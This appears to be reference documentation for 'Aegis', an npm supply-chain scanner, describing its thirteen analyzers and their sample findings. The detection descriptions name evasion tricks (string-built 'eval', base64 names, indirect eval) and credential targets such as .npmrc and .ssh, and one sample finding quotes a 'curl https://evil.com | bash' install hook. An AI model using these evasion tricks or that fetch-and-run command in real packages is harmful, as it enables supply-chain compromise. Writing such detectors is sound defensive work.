# Analyzer Reference

Aegis runs 13 analyzers on every package. This page provides a brief reference for each one.

---

## 1. Static Code Analysis

**Source:** `src/analyzers/static_code.rs`

Regex-based pattern matching across all JS/TS files. Detects `eval()` with dynamic arguments, `new Function()`, `Buffer.from()` fed into eval, `child_process.exec()`, pipe-to-shell patterns, environment variable harvesting, sensitive file reads, raw sockets, hardcoded IP URLs, DNS exfiltration, and dynamic `fetch()` calls. Comment stripping is applied before matching to reduce false positives from documented code. Severities range from Critical (eval with encoded payload) to Low (dynamic fetch URL).

**Example finding:** `CRITICAL -- eval() with dynamic argument in lib/index.js:14`

---

## 2. AST Analysis

**Source:** `src/analyzers/ast.rs`

Uses tree-sitter to parse JS, TS, and TSX files into an abstract syntax tree. Detects structural patterns that regex cannot reliably catch: calls to dangerous functions (`eval`, `exec`, `execSync`), deeply nested call expressions (threshold: 5 levels, a sign of obfuscation), and dynamic `require()` calls with non-literal arguments. Files larger than 1 MB and minified files are skipped. Severities: Critical for dangerous function calls, Medium for deep nesting.

**Example finding:** `CRITICAL -- Direct call to eval() in src/util.js:22`

---

## 3. Anti-Evasion Detection

**Source:** `src/analyzers/ast.rs` (integrated into the AST analyzer)

Detects techniques attackers use to evade static regex scanning: string concatenation that assembles dangerous names (`'ev' + 'al'`), bracket notation property access (`global['eval']`), base64-encoded function names via `atob('ZXZhbA==')`, indirect eval with the comma operator (`(0, eval)()`), and variable aliasing (`const e = eval; e(code)`). All detections are Critical severity because evasion implies intent to hide malicious behavior.

**Example finding:** `CRITICAL -- String fragments concatenate to 'eval' in lib/loader.js:8`

---

## 4. Binary Inspection

**Source:** `src/analyzers/binary.rs`

Scans binary files (`.wasm`, `.node`, `.exe`, `.dll`, `.so`, `.dylib`) bundled inside npm packages. Extracts printable ASCII strings and searches for embedded shell commands (`/bin/sh`, `cmd.exe`), credential-related strings (`AWS_SECRET`, `.npmrc`, `.ssh/`), and suspicious URLs. Also measures Shannon entropy to flag packed or encrypted payloads. Native addon files (`.node`, `.exe`, `.dll`, `.so`) are High severity; WebAssembly files are Medium.

**Example finding:** `HIGH -- Native binary contains embedded URL: http://evil.com in lib/addon.node`

---

## 5. Data Flow Analysis

**Source:** `src/analyzers/dataflow.rs`

Lightweight taint tracking that follows data across assignments within a file. Tracks four taint kinds: environment data (`process.env`), credentials (reads from `.npmrc`, `.ssh`), network data (`fetch`, `http.get`), and process handles (`child_process`). Flags multi-step attack chains such as environment exfiltration (read env, encode, send over network), dropper patterns (download, write to disk, execute), and credential theft. Uses tree-sitter for JS parsing. Severities: Critical for complete exfiltration chains, High for partial chains.

**Example finding:** `CRITICAL -- Environment data flows to network request in src/telemetry.js`

---

## 6. Provenance Verification

**Source:** `src/analyzers/provenance.rs`

Compares the files in an npm tarball against the source tree in the package's declared GitHub repository. Detects supply-chain attacks where the published tarball contains files not present in the source repo. Also checks for npm Sigstore provenance attestations. Requires network access to the GitHub API; set `GITHUB_TOKEN` to avoid rate limits. SSRF validation is applied to all constructed GitHub API URLs. Severity: High for injected files, Medium for missing provenance attestation.

**Example finding:** `HIGH -- File lib/payload.js exists in npm tarball but not in GitHub source`

---

## 7. Install Script Analysis

**Source:** `src/analyzers/install_scripts.rs`

Examines `preinstall`, `postinstall`, and `preuninstall` scripts in `package.json`. Flags scripts that contain shell commands (`curl`, `wget`, `bash`, `sh -c`), inline `node -e` evaluation, or URLs. Safe and common script values (`husky install`, `node-gyp rebuild`, `patch-package`, etc.) are whitelisted. When a script runs a JS file, the analyzer also checks that file's contents for dangerous patterns. Severities: Critical for pipe-to-shell (`curl ... | bash`), High for other suspicious commands.

**Example finding:** `CRITICAL -- postinstall downloads and executes remote script: "curl https://evil.com | bash"`

---

## 8. Obfuscation Detection

**Source:** `src/analyzers/obfuscation.rs`

Detects obfuscated or encoded code using three signals: long hex strings (50+ characters), long base64 strings (100+ characters with optional padding), and sequences of hex/unicode escape characters (`\xNN`, `\uNNNN`). Also computes Shannon entropy per line and flags lines with unusually high entropy as potentially packed or encrypted. Comment stripping is applied before analysis. Severities: High for hex/base64 payloads and high-entropy lines, Medium for escape sequences.

**Example finding:** `HIGH -- Long base64 encoded string (247 chars) in lib/config.js:31`

---

## 9. Maintainer Tracking

**Source:** `src/analyzers/maintainer.rs`

Analyzes npm registry metadata to detect suspicious ownership changes. Flags packages where all maintainers were replaced between versions (potential account takeover), where a new maintainer was added shortly before a release (within 7 days), and where maintainer email domains changed. Works on registry metadata rather than file contents. Severities: High for full maintainer replacement, Medium for recent additions or domain changes.

**Example finding:** `HIGH -- All maintainers replaced between v1.2.0 and v1.3.0`

---

## 10. AI Hallucination Detection

**Source:** `src/analyzers/hallucination.rs`

Detects packages that appear to be registered to exploit AI-hallucinated names -- package names that LLMs invent in code suggestions but that do not actually exist. Signals include: generic "helper/utils" naming patterns (`data-processor`, `json-utils`), very few published versions, low weekly download counts, and recent creation dates. Multiple signals are combined; a single signal alone is not sufficient. Severity: Medium for likely hallucination-squatted names.

**Example finding:** `MEDIUM -- Package name matches AI hallucination pattern and was created recently with minimal downloads`

---

## 11. Typosquatting Detection

**Source:** `src/analyzers/hallucination.rs` (integrated into the hallucination analyzer)

Uses normalized Levenshtein distance to compare package names against a list of popular npm packages. Detects specific attack techniques: adjacent character swaps (`axois` vs `axios`), missing characters (`lodas` vs `lodash`), extra characters (`expresss`), and single character substitutions. Also flags non-ASCII homoglyphs (visual lookalikes of ASCII letters). A whitelist of known legitimate near-matches (e.g., `lodash-es`, `react-dom`) and plugin/extension naming conventions prevents false positives. Severity: High for specific typosquat techniques, Medium for generic close names.

**Example finding:** `HIGH -- Package name 'axois' is a typosquat of 'axios' (adjacent character swap)`

---

## 12. CVE Lookup

**Source:** `src/analyzers/cve.rs`

Queries the [OSV.dev](https://osv.dev/) API for known vulnerabilities affecting the specific package name and version. Translates CVSS scores into Aegis severity levels and includes advisory IDs (CVE, GHSA) and reference URLs in findings. The request has a 10-second timeout; network failures are logged as warnings but do not block the scan. Severities: mapped from CVSS -- Critical (9.0+), High (7.0+), Medium (4.0+), Low (below 4.0).

**Example finding:** `HIGH -- CVE-2023-12345: Prototype pollution in lodash < 4.17.21`

---

## 13. Dependency Tree Analysis

**Source:** `src/analyzers/deptree.rs`

Performs a breadth-first traversal of the package's transitive dependency tree (up to depth 3, max 200 packages). For each dependency, checks for deprecated packages, install scripts (`preinstall`, `install`, `postinstall`), and recently published versions. Uses the npm registry's abbreviated metadata endpoint for efficiency. Severities: High for deprecated dependencies with install scripts, Medium for deprecated packages, Low for informational notes about tree depth.

**Example finding:** `MEDIUM -- Transitive dependency 'old-lib@2.0.0' is deprecated`

---

## Additional: Version Diff Analysis

**Source:** `src/analyzers/diff.rs`

Compares two extracted versions of a package side-by-side. Flags newly added files with suspicious names (`payload`, `backdoor`, `keylog`), new binary files, newly introduced dangerous patterns (`eval`, `child_process`, obfuscated strings), and significant increases in obfuscation between versions. Used internally when version comparison data is available. Severities vary by finding type.

---

## Additional: YAML Rules Engine

**Source:** `src/rules/loader.rs`, `src/rules/engine.rs`

Ships 10 built-in rules and supports custom community rules. Each YAML rule defines a regex pattern, severity, category, optional file glob filter, and exclude paths. Rules are matched line-by-line against package file contents. Place custom `.yml` files in a `rules/` directory to extend detection. See the main README for the rule format and `rules/examples/` for working examples.
